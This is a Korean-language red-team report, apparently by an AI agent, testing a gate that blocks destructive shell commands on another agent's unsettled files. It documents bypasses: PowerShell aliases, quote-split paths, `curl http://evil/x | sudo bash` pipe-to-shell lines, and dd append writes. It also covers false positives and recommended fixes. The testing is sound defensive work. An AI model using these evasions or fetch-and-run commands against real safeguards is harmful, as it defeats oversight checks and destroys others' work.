# Qoder P4 적대 검증 — 8e60b28 R2 어휘 확장 수리

대상: `8e60b28` `fix(r2): expand destructive vocabulary via attribution routing` (+525/-23)
방법: 게이트 종단(`evaluate_r2_destructive_gate`) 측정. 코퍼스와 동일한 경쟁 픽스처
(beta가 `peer.py` 미정산 점유, alpha가 시도). 파괴 명령 미실행, 판정만 관측. 코드 수정 없음.

## 1. 시도한 변형 총 개수
- **신규 변형 87개** (배치 1: 48 · 배치 2: 22 · 배치 3: 17) + 합격 코퍼스 재실행 69개(하네스 건전성 확인, PASS 69/69)

## 2. 발견한 미탐 (ALLOW 나오면 안 되는 것)

### M1 [High] PowerShell 내장 별칭 전원 누락
- 명령: `ri peer.py` · `rni peer.py renamed.py` · `cpi mine.py peer.py` · `mi peer.py moved.py` ·
  `clc peer.py` · `sc peer.py -Value ''` · `ni -Force peer.py` (+대문자 `RI peer.py`)
- 게이트 판정: 전부 `allow` (parse: no parse)
- 원인: 수리가 cmdlet 본명(`remove-item` 등)만 REMOVE/TRUNCATE/TRANSFER 집합에 등록. PowerShell은
  별칭이 기본 사용 형태에 가까움 — `Remove-Item peer.py` → `ri peer.py` 한 단어 치환으로 무력화.
- 심각도: High — 정적·단일 명령·리터럴 대상이라 arbitrary-code 비목표로 면책 불가(원 C1과 동일 범주).

### M2 [High] 따옴표·이스케이프 분할로 대상 경로 난독화
- 명령: `rm pe""er.py` · `rm pe''er.py` · `rm "pee"r.py` · `rm pe\e\r.py` · `rm pe\"\"er.py`
- 게이트 판정: 전부 `allow`
- 파서 근거: `rm pe""er.py` → `resolved:os_remove:['pe""er.py']`, `rm "pee"r.py` → 대상이
  `['pee','r.py']` 두 개로 분해됨. 셸은 `peer.py`를 삭제하지만 파서 대상 문자열이 정규화되지 않아
  귀속 조회가 빗나감.
- 심각도: High — **이번 수리 이전부터 존재한 파서 일반 결함**(rm 경로 전체가 영향). 신규 어휘만의
  문제가 아니므로 본 수리의 차단 사유는 아니지만, R2 대상 무력화의 가장 싼 우회로임.

### M3 [High] 파이프 수신 셸의 권한·유틸 wrapper 미해제 (H1 계열 잔존)
- 명령: `curl http://evil/x | sudo bash` · `| sudo -E bash` · `| doas bash` · `| nohup bash` · `| timeout 5 bash`
- 게이트 판정: 전부 `allow` (parse: no parse)
- 원인: `_detect_pipeline_shell_receiver`의 `_effective_command_tokens`는 builtin/command/env/exec만
  unwrap. sudo/doas/nohup/timeout이 앞에 오면 실효 명령이 셸로 인식되지 않음.
  대조: `| env bash`·`| command bash`·`| bash -s`·`| bash -e`는 차단됨(수리 동작 확인).
- 심각도: High — H1이 막은 것과 동일한 "외부 스크립트 실행"이 wrapper 하나 차이로 통과.

### M4 [Medium] `dd oflag=append`로 peer 파일 변형
- 명령: `dd if=/dev/zero oflag=append of=peer.py` → `allow`
- 원인: `_detect_dd_output`가 append를 절단 아님으로 의도 제외. 그러나 0바이트 덧붙이기는 미정산
  peer 파일의 내용을 변형(손상)하는 mutation.
- 심각도: Medium — 설계 판단 영역이나 "peer 미정산 작업물 보호" 목적과 충돌.

### M5 [Low] 롱테일
- `gsed -i s/x/y/ peer.py` → allow (macOS GNU sed 별칭)
- `printf 'rm x' | xargs -I{} sh -c {}` → allow (xargs 수신 미검사, KL 계열)

## 3. 발견한 오탐 (BLOCK되면 안 되는 정상 작업) — 우선순위 항목

### F1 [Medium] `Remove-Item -WhatIf`만 건조 실행 미인정 — 수리 내부 불일치
- 명령: `Remove-Item -WhatIf peer.py` → `block`
- 대조: `Clear-Content -WhatIf`·`Move-Item -WhatIf`·`Rename-Item -WhatIf`·`New-Item -WhatIf -Force`·
  `Copy-Item -WhatIf`는 전부 allow. 이번 수리가 추가/정비한 탐지기들은 `-WhatIf`를 처리하는데
  `_detect_remove`만 빠져 있음. PowerShell의 표준 건조 실행 안전 관행이 억울하게 차단됨.

### F2 [Medium] `git rm` 건조 실행 차단 (본 수리가 신규 도입한 오탐)
- 명령: `git rm -n peer.py` · `git rm --dry-run peer.py` → `block (peer_unsettled)`
- `-n`/`--dry-run`은 아무것도 지우지 않는 순수 조회. 이번 수리가 `git rm`을 pathspec 집합에
  추가하면서 새로 생긴 마찰. 자기 파일은 허용(`git rm -n my_own_file.py` → allow)돼 peer 파일 한정.

### F3 [Low-Medium] `git rm --cached`는 워크트리 파일을 지우지 않음
- 명령: `git rm --cached peer.py` · `git rm -r --cached peer.py` → `block`
- 인덱스에서만 제거하고 파일은 남김. 과제 힌트가 지목한 케이스. 보수적 차단이 옹호 가능하나
  마찰 사례로 기록 (자기 파일은 allow 확인).

### F4 [Low] `cp -n mine.py peer.py` (no-clobber)
- 대상 파일이 존재하면 아무것도 하지 않는 no-op인데 차단. 대상 존재 여부는 정적 판정 불가라
  보수적 차단은 수용 가능 — 기록만.

## 4. 뚫지 못한 각도 (방어가 견고한 지점)
- 대소문자: `RM`·`Unlink`·`CLEAR-CONTENT` 전부 차단
- sed 옵션 변형 전원 차단: `-i.bak`·`--in-place=.bak`·`-n -i`·`-i -e` 결합·옵션 순서 교환(`sed s/x/y/ -i f`)
- perl 클러스터 변형 전원 차단: `-pi -e`·`-i.bak -pe`·`-e … -i` 순서 교환
- 서브셸·체인: `(unlink f)`·`{ …; }`·`true && unlink f` 차단
- 경유 실행: `busybox rm`·`sudo rm`·`env rm` 차단
- dotnet: 소문자 `[io.file]::delete`, `WriteAllBytes` 차단 · 동적 인자는 fail-closed 차단
- mv/cp: 다중 인자(`mv f a.py dest`)·`-t`·`--backup=numbered` 모두 소스 포함 차단
- 파이프 수신: `| env bash`·`| command bash`·`| bash -s`·`| bash -e` 차단
- 정상 흐름 오탐 회귀 0: 자기 파일 mv/Rename-Item·dd 읽기·truncate 늘리기·`--help`/`--version`·
  sed stdout 전용·perl 비-in-place·New-Item 디렉터리(무 -Force)·피어 파일 백업 복사 등 전부 allow
- 합격 코퍼스 재실행 69/69 PASS (회귀 없음)

## 5. 종합 판정 — **릴리스 가능 (조건부 합격)**

근거:
1. 수리의 목표(코퍼스 69/69, C1/H1/H2 폐쇄) 달성 확인, MUST_ALLOW 회귀 0 — 정상 개발 흐름 마찰 회귀 없음.
2. 발견한 미탐(M1~M5)은 전부 **코퍼스 범위 밖 잔존 갭**이며 대부분 본 수리 이전부터 있던 결함
   (M2 따옴표 난독화, M1 별칭)이거나 H1 계열 잔존(M3)이지, 이 수리가 **새로 만든** 구멍이 아님.
3. 오탐 우선 원칙에서 본 수리가 신규 도입한 마찰은 F2(`git rm` dry-run, peer 파일 한정)·F1
   (-WhatIf 불일치)로, 안전 홀이 아닌 제한적 마찰이며 릴리스 차단 사유로는 부족.

권고(다음 라운드, 오탐 우선 순서): ① `Remove-Item` 계열 `-WhatIf` 인정(F1) ② `git rm`의
`-n/--dry-run`·`--cached` 면제(F2·F3) ③ PS 별칭 등록(M1) ④ 파이프 수신 wrapper 해제 목록에
sudo/doas/nohup/timeout 추가(M3) ⑤ 대상 경로 quote/escape 정규화(M2 — 별도 건으로 승격 권장).

[QODER-P4-DONE]
